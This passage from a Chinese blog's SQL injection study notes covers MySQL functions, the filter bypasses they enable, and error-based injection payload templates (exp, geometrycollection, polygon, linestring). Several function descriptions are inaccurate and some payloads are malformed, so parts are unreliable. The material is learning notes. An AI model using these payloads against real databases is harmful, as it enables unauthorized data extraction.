employees;<br></code></pre></td></tr></table></figure>\n\n<p>在这个例子中，ELT函数将返回给定位置（即<code>dept_id</code>）的相应字符串。如果<code>dept_id</code>为3，则返回“Engineering”字符串。如果<code>dept_id</code>大于N，则ELT函数返回Null。</p>\n<p>请注意，ELT函数只能取一到30个参数，超过30个参数则会被截断。此外，在实际使用中，ELT函数可能不是最好的解决方案，因为它需要由多个字符串常量组成的参数列表，并且很难维护或更新。</p>\n<hr>\n<p>或许这也算是一种获取回显的方式吧</p>\n<h1 id=\"field函数\"><a href=\"#field函数\" class=\"headerlink\" title=\"field函数\"></a>field函数</h1><p><code>MySQL Field()</code>函数用于返回字段的索引位置，该函数可以作为SELECT查询中的一个表达式使用。以下是关于<code>MySQL Field()</code>函数的详细介绍：</p>\n<p>语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">FIELD(str, str1, str2, ...)<br></code></pre></td></tr></table></figure>\n\n<p>参数说明：</p>\n<ul>\n<li><code>str</code>: 需要被比较的字符串或字符值</li>\n<li><code>str1</code>: 字符串列表（必须提供至少一个）</li>\n<li><code>str2</code>: 字符串列表</li>\n</ul>\n<p>返回值：</p>\n<p>如果str在参数列表（str1、str2，…）中，则返回其排名，而首个字符串将返回“1”。如果没有匹配，则返回0。</p>\n<p>备注：</p>\n<ul>\n<li>参数不区分大小写。</li>\n<li>这个函数是不区分大小写的，会根据当前的区域设置进行排序。</li>\n</ul>\n<p>示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT FIELD(&#x27;cat&#x27;, &#x27;dog&#x27;, &#x27;cat&#x27;, &#x27;bird&#x27;); //输出：3<br>SELECT FIELD(&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;orange&#x27;); //输出：0<br>SELECT FIELD(&#x27;Dog&#x27;, &#x27;apple&#x27;, &#x27;cat&#x27;, &#x27;Bird&#x27;); //输出：4<br></code></pre></td></tr></table></figure>\n\n<hr>\n<p>类似于python里面的.index(xxx)</p>\n<h1 id=\"benchmark函数\"><a href=\"#benchmark函数\" class=\"headerlink\" title=\"benchmark函数\"></a>benchmark函数</h1><p><code>MySQL BENCHMARK()</code>函数是用于测试数据库性能专用函数，它会反复执行一个指定的表达式，并返回执行表达式所需的时间。以下是有关BENCHMARK（）函数的详细介绍：</p>\n<p>语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">BENCHMARK(number_of_times, expression)<br></code></pre></td></tr></table></figure>\n\n<p>参数说明：</p>\n<ul>\n<li><code>number_of_times</code>: 指定表达式要执行的次数</li>\n<li><code>expression</code>: 要被执行多次的表达式</li>\n</ul>\n<p>返回值：</p>\n<p>该函数返回执行指定表达式所需的时间，以秒为单位。</p>\n<p>备注：</p>\n<ul>\n<li>BENCHMARK()函数不保存正在执行的表达式的结果。</li>\n<li>在进行性能测试时，请务必慎重使用此函数。</li>\n</ul>\n<p>示例：</p>\n<p>以下查询将对SELECT 1 + 1进行1000000次测试：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT BENCHMARK(1000000, SELECT 1 + 1);<br></code></pre></td></tr></table></figure>\n\n<p>输出结果应标识表达式需要的总毫秒数。</p>\n<p>BENCHMARK()也可以用于比较两个或更多表达式的效率，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT BENCHMARK(1000000, (SELECT 1+2)), BENCHMARK(1000000, (SELECT 1*2)), BENCHMARK(1000000, (SELECT 1/2));<br></code></pre></td></tr></table></figure>\n\n<p>这个查询将快速计算三个表达式的平均执行时间，并将其放入结果集中返回。</p>\n<h1 id=\"get-lock函数\"><a href=\"#get-lock函数\" class=\"headerlink\" title=\"get_lock函数\"></a>get_lock函数</h1><p><code>GET_LOCK()</code>函数是MySQL提供的一个用于获取排他锁的函数。使用该函数，可以确保同时只有一个会话（连接）可以访问某个共享资源，从而防止并发访问冲突。</p>\n<h3 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h3><p><code>GET_LOCK(str, timeout)</code></p>\n<h3 id=\"参数说明\"><a href=\"#参数说明\" class=\"headerlink\" title=\"参数说明\"></a>参数说明</h3><ul>\n<li>str：表示锁的名称，必须是非空字符串。</li>\n<li>timeout：表示获取锁的等待时间，单位为秒；如果设为0，则表示一直等待到锁被释放后再返回结果。如果等待超时，则函数返回0。</li>\n</ul>\n<h3 id=\"返回值\"><a href=\"#返回值\" class=\"headerlink\" title=\"返回值\"></a>返回值</h3><p>该函数返回一个整型数值，如果获取锁成功，则返回1；否则返回0。</p>\n<h3 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h3><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> GET_LOCK(<span class=\"hljs-string\">&#x27;my_lock&#x27;</span>, <span class=\"hljs-number\">10</span>); <span class=\"hljs-comment\">-- 获取名为&#x27;my_lock&#x27;的锁，最长等待10秒</span><br><br><span class=\"hljs-comment\">-- 如果获取锁成功，则返回1；失败则返回0</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h3><ul>\n<li>在调用 <code>GET_LOCK()</code> 函数时，系统会自动创建匹配名称的锁对象，如果该名称已存在锁对象，则会直接获得锁。反之，等待其他会话释放锁后，再进行获取。</li>\n<li>当会话关闭时，MySQL会自动释放该会话所占用的所有锁，因此无需显式调用 <code>RELEASE_LOCK()</code> 函数来释放锁对象。</li>\n<li>当查询结束时，也会自动释放锁对象。但是，开发者仍然应该遵循良好的编程习惯，显式调用 <code>RELEASE_LOCK()</code> 函数来释放所占资源。</li>\n</ul>\n<hr>\n<p>再看看与之对应的release_lock函数吧</p>\n<h1 id=\"release-lock函数\"><a href=\"#release-lock函数\" class=\"headerlink\" title=\"release_lock函数\"></a>release_lock函数</h1><p><code>RELEASE_LOCK()</code> 函数是MySQL提供的一个用于释放由 <code>GET_LOCK()</code> 函数获取到的锁的函数。</p>\n<h3 id=\"语法-1\"><a href=\"#语法-1\" class=\"headerlink\" title=\"语法\"></a>语法</h3><p><code>RELEASE_LOCK(str)</code></p>\n<h3 id=\"参数说明-1\"><a href=\"#参数说明-1\" class=\"headerlink\" title=\"参数说明\"></a>参数说明</h3><ul>\n<li>str：表示要释放的锁名称，必须是非空字符串。</li>\n</ul>\n<h3 id=\"返回值-1\"><a href=\"#返回值-1\" class=\"headerlink\" title=\"返回值\"></a>返回值</h3><p>该函数返回一个整型数值，表示当前会话是否成功释放了对该锁的占用，如果成功则返回1，否则返回0。</p>\n<h3 id=\"示例-1\"><a href=\"#示例-1\" class=\"headerlink\" title=\"示例\"></a>示例</h3><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> GET_LOCK(<span class=\"hljs-string\">&#x27;my_lock&#x27;</span>, <span class=\"hljs-number\">10</span>); <span class=\"hljs-comment\">-- 获取名为&#x27;my_lock&#x27;的锁，最长等待10秒</span><br><br><span class=\"hljs-comment\">-- 执行一些操作</span><br><br><span class=\"hljs-keyword\">SELECT</span> RELEASE_LOCK(<span class=\"hljs-string\">&#x27;my_lock&#x27;</span>); <span class=\"hljs-comment\">-- 释放名为&#x27;my_lock&#x27;的锁</span><br><br><span class=\"hljs-comment\">-- 执行其他操作</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"注意事项-1\"><a href=\"#注意事项-1\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h3><ul>\n<li>当使用 <code>GET_LOCK()</code> 函数获取到锁后，应当在使用完之后尽快用 <code>RELEASE_LOCK()</code> 函数释放锁，确保其他会话可以及时获取资源。</li>\n<li>当调用该函数来释放不存在的锁对象时，将不会有任何效果，并且该函数返回0。</li>\n</ul>\n<h1 id=\"analyse函数\"><a href=\"#analyse函数\" class=\"headerlink\" title=\"analyse函数\"></a>analyse函数</h1><p><code>ANALYZE</code> 函数是 MySQL 数据库中的一个语句，它用于收集并更新表和索引的统计信息，以便MySQL数据库查询优化器可以更准确地评估执行操作所需的代价。执行 <code>ANALYZE</code> 后，MySQL 就会重新进行优化，这通常会导致查询执行速度的提升。</p>\n<p>有两种情况下建议使用 <code>ANALYZE</code> 函数：</p>\n<ol>\n<li><p>当执行某个查询语句时,其执行时间过长，则可能需要使用 <code>ANALYZE</code> 命令来分析该表的索引；</p>\n</li>\n<li><p>当对表的数据进行大量的添加、删除或修改操作后，建议使用 <code>ANALYZE</code> 来更新表的统计信息，因为大量的修改会使得表的统计信息变得不准确。</p>\n</li>\n</ol>\n<p>以下是 <code>ANALYZE</code> 函数的基本语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">ANALYZE TABLE table_name;<br></code></pre></td></tr></table></figure>\n\n<p>其中， <code>table_name</code> 表示要分析的表的名称，可以同时指定多个表。例如:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">ANALYZE TABLE table1, table2;<br></code></pre></td></tr></table></figure>\n\n<p>总而言之， <code>ANALYZE</code> 函数可以帮助开发人员更好地优化 MySQL 数据库的查询性能。</p>\n<h1 id=\"from-…-for-…语句\"><a href=\"#from-…-for-…语句\" class=\"headerlink\" title=\"from … for …语句\"></a>from … for …语句</h1><p>MySQL中，<code>FROM...FOR</code>语句用于限制返回的行数和更新的行数。 它的基本语法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT column_name(s)<br>FROM table_name<br>WHERE condition<br>LIMIT num_rows <br>FOR UPDATE;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><code>column_name(s)</code>：要从表中选择的列的名称。</li>\n<li><code>table_name</code>：要从中选择数据的MySQL表的名称。</li>\n<li><code>condition</code>：对要检索的行进行筛选的条件。</li>\n<li><code>num_rows</code>：要读取的记录行数的数量。</li>\n<li><code>FOR UPDATE</code>：指定行锁定以确保在事务代码块执行期间不要让其他会话修改每个已选择的行。</li>\n</ul>\n<p>举个例子，假设我们在employee表中有一个名为salary的列，并且我们只想选择这一列前10个最高薪水的员工。 那么我们可以使用以下SQL查询：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT salary<br>FROM employee<br>ORDER BY salary DESC<br>LIMIT 10<br>FOR UPDATE;<br></code></pre></td></tr></table></figure>\n\n<p>使用<code>ORDER BY salary DESC</code>对薪资进行降序排序，然后使用<code>LIMIT 10</code>选择前10行。 最后，使用<code>FOR UPDATE</code>将这些行锁定以防止其他会话修改它们。</p>\n<hr>\n<p>用于绕过函数中参数逗号被过滤</p>\n<h1 id=\"limit-offset语句\"><a href=\"#limit-offset语句\" class=\"headerlink\" title=\"limit..offset语句\"></a>limit..offset语句</h1><p><code>LIMIT...OFFSET</code>查询是MySQL中一种限制结果集大小和偏移量的常用方法，常用于分页查询。它的语法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT column_name(s)<br>FROM table_name<br>LIMIT offset, limit;<br></code></pre></td></tr></table></figure>\n\n<p>其中，<code>offset</code> 是要返回的结果集的起始位置（从0开始计数），<code>limit</code> 指定要返回结果集的最大行数。</p>\n<p>例如，如果想要查询表 <code>users</code> 中的第 6-10 行数据，可以使用以下查询语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT *<br>FROM users<br>LIMIT 5, 5;<br></code></pre></td></tr></table></figure>\n\n<p>这个查询语句将会返回 <code>users</code> 数据表中从第6行到第10行的所有数据。</p>\n<p>注意，在使用 <code>LIMIT...OFFSET</code> 时，应该按照适当的顺序对待数据。即首先执行排序和筛选操作，然后应用 <code>LIMIT</code> 子句。否则结果可能不准确。</p>\n<p>此外还可以省略 <code>offset</code> 值，此时默认起始位置为 0。例如，以下查询将返回 <code>users</code> 数据表中前5条记录：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT *<br>FROM users<br>LIMIT 5;<br></code></pre></td></tr></table></figure>\n\n<hr>\n<p>这用于绕过limit语句中的逗号过滤</p>\n<h1 id=\"pi函数\"><a href=\"#pi函数\" class=\"headerlink\" title=\"pi函数\"></a>pi函数</h1><p>在MySQL中，<code>PI()</code> 函数返回圆周率的值，即 3.141592653589793。</p>\n<p>该函数不需要任何参数。</p>\n<p>用法示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT PI();<br></code></pre></td></tr></table></figure>\n\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">3.141592653589793<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"pow函数\"><a href=\"#pow函数\" class=\"headerlink\" title=\"pow函数\"></a>pow函数</h1><p><code>POW()</code>是MySQL中的一个数学函数，用于返回指定数字的指定次幂。它可以将第一个参数（底数）提高到第二个参数（指数）的幂。</p>\n<p>具体语法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">POW(X, Y)<br></code></pre></td></tr></table></figure>\n\n<p>其中，X为底数，Y为指数。</p>\n<p>举例来说，如果要计算2的3次方，则使用以下语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">SELECT POW(2, 3);<br></code></pre></td></tr></table></figure>\n\n<p>执行以上语句后，结果将会是8。</p>\n<p>需要注意的是，<code>POW()</code>只能对正数、负数和0进行计算。如果要计算小数的幂，可以使用POWER()函数。</p>\n<h1 id=\"char函数\"><a href=\"#char函数\" class=\"headerlink\" title=\"char函数\"></a>char函数</h1><p>MySQL的CHAR函数用于将一个整数转换为对应的ASCII字符。它可以接受一个或两个参数：</p>\n<ul>\n<li>如果只有一个参数，则该参数是整数，并返回其对应的ASCII字符。</li>\n<li>如果有两个参数，则第一个参数是整数，第二个参数是字符集编码，函数将使用该编码返回对应的字符。</li>\n</ul>\n<p>下面是两种参数形式的示例：</p>\n<ol>\n<li><p>将整数97转换为对应的ASCII字符’a’：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">SELECT CHAR(97);<br></code></pre></td></tr></table></figure>\n\n<p>结果: ‘a’</p>\n</li>\n<li><p>将整数233转换为对应的EUC-KR字符：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">SELECT CHAR(233, &#x27;euckr&#x27;);<br></code></pre></td></tr></table></figure>\n\n<p>结果：视具体字符集编码而定</p>\n</li>\n</ol>\n<p>需要注意的是，如果字符集编码无效，将会抛出错误。因此，请确保提供正确的字符集编码。</p>\n<hr>\n<p>配合后面的ord函数可以起到混淆的作用</p>\n<h1 id=\"locate函数\"><a href=\"#locate函数\" class=\"headerlink\" title=\"locate函数\"></a>locate函数</h1><p>MySQL 的 <code>LOCATE()</code> 函数用于在字符串中查找指定子字符串的位置。该函数返回第一个匹配到子字符串的起始位置，如果没有找到则返回0。</p>\n<p><code>LOCATE()</code> 函数语法：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">LOCATE(substring, string, start_position)<br></code></pre></td></tr></table></figure>\n\n<p>其中：</p>\n<ul>\n<li><code>substring</code>：要查找的子字符串。</li>\n<li><code>string</code>：要查找的字符串。</li>\n<li><code>start_position</code>（可选）：开始查找的位置，默认为1。</li>\n</ul>\n<p>示例：</p>\n<p>假设我们有一个名叫 <code>students</code> 的表，并且该表含有以下数据：</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>name</th>\n<th>address</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>Alice</td>\n<td>New York City</td>\n</tr>\n<tr>\n<td>2</td>\n<td>Bob</td>\n<td>Los Angeles</td>\n</tr>\n<tr>\n<td>3</td>\n<td>Claire</td>\n<td>Chicago</td>\n</tr>\n<tr>\n<td>4</td>\n<td>Daniel</td>\n<td>Houston</td>\n</tr>\n<tr>\n<td>5</td>\n<td>Elizabeth</td>\n<td>Miami</td>\n</tr>\n</tbody></table>\n<p>现在我们想要查找所有名字中包含字母 “e” 的学生记录的信息，并按照地址的字母顺序进行排序，可以使用如下 SQL 语句：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> students<br><span class=\"hljs-keyword\">WHERE</span> LOCATE(<span class=\"hljs-string\">&#x27;e&#x27;</span>, name) <span class=\"hljs-operator\">&gt;</span> <span class=\"hljs-number\">0</span><br><span class=\"hljs-keyword\">ORDER</span> <span class=\"hljs-keyword\">BY</span> address;<br></code></pre></td></tr></table></figure>\n<p>该语句的执行结果为：</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>name</th>\n<th>address</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>Alice</td>\n<td>New York City</td>\n</tr>\n<tr>\n<td>5</td>\n<td>Elizabeth</td>\n<td>Miami</td>\n</tr>\n<tr>\n<td>2</td>\n<td>Bob</td>\n<td>Los Angeles</td>\n</tr>\n<tr>\n<td>3</td>\n<td>Claire</td>\n<td>Chicago</td>\n</tr>\n<tr>\n<td>4</td>\n<td>Daniel</td>\n<td>Houston</td>\n</tr>\n</tbody></table>\n<p>从上述结果可以看出，我们使用 <code>LOCATE()</code> 函数找到了包含字母 “e” 的学生名字所在的位置，并筛选出来，然后按照地址排序。</p>\n<hr>\n<p>可以用来替换field函数</p>\n<h1 id=\"celi函数\"><a href=\"#celi函数\" class=\"headerlink\" title=\"celi函数\"></a>celi函数</h1><p>在MySQL中，CEIL()函数用于返回给定数字表达式的最小整数，该整数大于或等于该数字表达式。如果数字表达式是正数，则向上取整到最接近的整数。如果数字表达式是负数，则向下取整到最接近整数。</p>\n<p>以下是使用CEIL()函数的语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">CEIL(number)<br></code></pre></td></tr></table></figure>\n\n<p>其中，number是待求最小整数的数字表达式。</p>\n<p>示例：</p>\n<p>假设x&#x3D;2.3</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT CEIL(x); -- 结果为3<br></code></pre></td></tr></table></figure>\n\n<p>对于负数，向下取整到最接近整数：</p>\n<p>假设y&#x3D;-4.5</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT CEIL(y); -- 结果为-4<br></code></pre></td></tr></table></figure>\n\n<hr>\n<p>可以用来替换floor函数达到floor报错的同样效果</p>\n<h1 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h1><p>这篇文章会持续更新，</p>\n<p>介绍所有我后面认识到的函数以及语法，</p>\n<p>但是很多易于理解的就不记录了</p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#16","url":"/2023/06/11/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-16/","content":"<p>这篇文章记录其他所有的报错注入</p>\n<span id=\"more\"></span>\n\n<p>注：这些报错<em><strong>全部</strong></em>都因为MySQL版本问题无法使用</p>\n<h1 id=\"exp-报错注入\"><a href=\"#exp-报错注入\" class=\"headerlink\" title=\"exp 报错注入\"></a>exp 报错注入</h1><p>首先简单介绍一下这个函数：</p>\n<p>exp()数学函数，用于计算e的x次方的函数。</p>\n<p>作用版本：5.5&lt;mysql版本&lt;5.6</p>\n<p>接下来看看这个报错注入的原理</p>\n<p>exp是以e为底的指数函数，</p>\n<p>但是，由于数字太大是会产生溢出</p>\n<p>这个函数会在参数大于709时溢出，报错</p>\n<p>将0按位取反就会返回“18446744073709551615”，</p>\n<p>再加上函数成功执行后返回0的缘故，</p>\n<p>我们将成功执行的函数取反就会得到最大的无符号BIGINT值</p>\n<p>我们通过子查询与按位求反，</p>\n<p>造成一个DOUBLE overflow error，并借由此注出数据</p>\n<p>构造如下语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">(exp(~(select * from (你的语句) a)))<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p><a href=\"https://blog.csdn.net/weixin_46706771/article/details/112727108\"> MYSQL 通过exp()报错注入_exp报错注入_C1yas0的博客-CSDN博客</a></p>\n</blockquote>\n<p>（我发现这几篇文章的报错注入好像都是参考这个博主的）</p>\n<h1 id=\"geometryCollection报错注入\"><a href=\"#geometryCollection报错注入\" class=\"headerlink\" title=\"geometryCollection报错注入\"></a>geometryCollection报错注入</h1><p>好了，，</p>\n<p>这个报错又是上面这个博主的了：</p>\n<p>函数解释<br>GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。对GeometryCollection的元素无任何限制，但下面介绍的GeometryCollection的子类会限制其成员。这类限制可能基于：</p>\n<p>元素类型（例如，MultiPoint可能仅包含Point元素）。</p>\n<p>维数</p>\n<p>对元素间空间交迭程度的限制</p>\n<p>官方文档中举例的用法如下：</p>\n<p>GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))<br>1<br>POINT(x,y) 函数,这是坐标函数，相当于X,Y坐标图上的一点。</p>\n<p>LINESTRING(x y,x y)函数,这个函数用来描述直线,两点连成的直线。</p>\n<p>报错原理<br>由于MYSQL无法用这样字符串画出图形,所以报错了</p>\n<p>约束条件<br>5.5&lt;mysql版本&lt;5.6</p>\n<p>注入代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">and geometrycollection((select * from(select * from (操作代码)a)b))<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p><a href=\"https://blog.csdn.net/weixin_46706771/article/details/112770319\">https://blog.csdn.net/weixin_46706771/article/details/112770319</a></p>\n</blockquote>\n<h1 id=\"Polygon报错注入\"><a href=\"#Polygon报错注入\" class=\"headerlink\" title=\"Polygon报错注入\"></a>Polygon报错注入</h1><p>依旧有版本限制。。。</p>\n<p>直接放上利用语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">and polygon (()select * from(你的语句)a)b );<br></code></pre></td></tr></table></figure>\n\n<p>函数解释：</p>\n<p>Polygon是代表多边几何对象的平面Surface。它由单个外部边界以及0或多个内部边界定义，其中，每个内部边界定义为Polygon中的1个孔。</p>\n<p>Polygon示例</p>\n<p>在地区地图上，Polygon对象可表示森林、区等。</p>\n<p>Polygon声明</p>\n<p>Polygon的边界由一组构成其外部边界和比内部边界的LinearRing归向集合构成(即，简单且封闭的LineString对象)。</p>\n<p>Polygon没有交叉的环。Polygon边界中的环可能会在Point处相交，但仅以切线方式相交。</p>\n<p>Polygon没有线、尖峰或穿孔。</p>\n<p>Polygon有由连接点集合构成的内部。</p>\n<p>Polygon可能包含孔。对于具有孔的Polygon，其外部不连接。每个孔定义了连接的外部部件。</p>\n<p>前述声明使得Polygon成为简单的几何对象。</p>\n<p>(不好意思,这块我得继续使用官方解释,)</p>\n<p>原理解释：</p>\n<p>Polygon() 这货真不好解释,空间几何总是比较抽象的一种。将几何分成区域，并且连接和交叉(个人是这么理解的)。只要知道这函数也是需要数字,大概就可以报错了,这样的概念。</p>\n<p>空间几何,非常的抽象,理解有难度的。</p>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/weixin_39851457/article/details/113678961\">https://blog.csdn.net/weixin_39851457/article/details/113678961</a></p>\n</blockquote>\n<h1 id=\"multipoint报错注入\"><a href=\"#multipoint报错注入\" class=\"headerlink\" title=\"multipoint报错注入\"></a>multipoint报错注入</h1><p>利用语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">and multipoint (()select * from(select user() )a)b );<br></code></pre></td></tr></table></figure>\n\n<p>函数解释：</p>\n<p>MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。</p>\n<p>MultiPoint示例</p>\n<p>在世界地图上，MultiPoint可以代表岛链。</p>\n<p>在城市地图上，MultiPoint可以表示售票处的出口。</p>\n<p>MultiPoint属性</p>\n<p>MultiPoint是0维几何对象。</p>\n<p>如果没有两个Point是相同的(具有等同的坐标值)，MultiPoint是简单的。</p>\n<p>MultiPoint的边界为空集合。</p>\n<p>(以上的解释透露出浓浓官方的味道,它的确是官方的解释)</p>\n<p>这个解释,我看的云里雾里，不管解释的多么全面以及抽象。MultiPoint()函数中肯定是需要数字的！</p>\n<p>原理解析：</p>\n<p>由于需要数字,那好吧。GeometryCollection的套路拿来,OK！稳定报错。</p>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/weixin_39851457/article/details/113678961\">https://blog.csdn.net/weixin_39851457/article/details/113678961</a></p>\n</blockquote>\n<h1 id=\"multinestring报错注入\"><a href=\"#multinestring报错注入\" class=\"headerlink\" title=\"multinestring报错注入\"></a>multinestring报错注入</h1><p>利用语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">and multlinestring (()select * from(你的语句)a)b );<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"multpolygon报错注入\"><a href=\"#multpolygon报错注入\" class=\"headerlink\" title=\"multpolygon报错注入\"></a>multpolygon报错注入</h1><p>利用语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">and multipolygon((select * from(select * from(操作代码)a)b))<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"linestring报错注入\"><a href=\"#linestring报错注入\" class=\"headerlink\" title=\"linestring报错注入\"></a>linestring报错注入</h1><p>利用语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">and linestring((select * from(select * from(操作代码)a)b))<br></code></pre></td></tr></table></figure>\n\n<p>这个包括前面三个来源于：</p>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/weixin_46706771/article/details/112770568\">MYSQL 其他函数报错注入_C1yas0的博客-CSDN博客</a></p>\n</blockquote>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#18","url":"/2023/06/19/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-18/","content":"<p>这篇文章学习各注入方式</p>\n<span id=\"more\"></span>\n\n<h1 id=\"HTTP-分割注入\"><a href=\"#HTTP-分割注入\" class=\"headerlink\" title=\"HTTP 分割注入\"></a>HTTP 分割注入</h1><p>这是一个非常妙的思路</p>\n\n\n<h1 id=\"SQL约束攻击\"><a href=\"#SQL约束攻击\" class=\"headerlink\" title=\"SQL约束攻击\"></a>SQL约束攻击</h1>\n\n\n\n<blockquote>\n<p><a href=\"https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html\">MySQL注入技巧 </a></p>\n<p><a href=\"https://xz.aliyun.com/t/5505\">SQL注入有趣姿势总结 </a></p>\n</blockquote>\n<h1 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h1><p>这篇文章我会持续更新，将所有新的注入姿势记录在这里！</p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#2","url":"/2023/06/02/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/","content":"<p>这篇文章的内容是mysql的查询</p>\n<span id=\"more\"></span>\n\n<h1 id=\"1-根据列名查询\"><a href=\"#1-根据列名查询\" class=\"headerlink\" title=\"1 根据列名查询\"></a>1 根据列名查询</h1><p>有两种方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select * from 表名 where 列名=值<br><br>select * from 表名 where id in (&#x27;值&#x27;)<br></code></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; select * from test_table where name=&#x27;Vincent&#x27;;<br>+---------+------+<br>| name    | age  |<br>+---------+------+<br>| Vincent |   18 |<br>+---------+------+<br><br>mysql&gt; select * from test_table where name in (&#x27;Vincent&#x27;);<br>+---------+------+<br>| name    | age  |<br>+---------+------+<br>| Vincent |   18 |<br>+---------+------+<br></code></pre></td></tr></table></figure>\n\n<p>结果一样</p>\n<p>还有一种，例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select * from test_table where name=(select name from test_table where age=18);<br></code></pre></td></tr></table></figure>\n\n<p>这个就类似于变量的思想</p>\n<h1 id=\"2-union联合查询\"><a href=\"#2-union联合查询\" class=\"headerlink\" title=\"2 union联合查询\"></a>2 union联合查询</h1><p>这个我问了一下chatgpt：</p>\n<p>在 MySQL 中，<code>UNION</code> 是一种结合多个 <code>SELECT</code> 语句结果集的方法。该操作符将两个或多个 <code>SELECT</code> 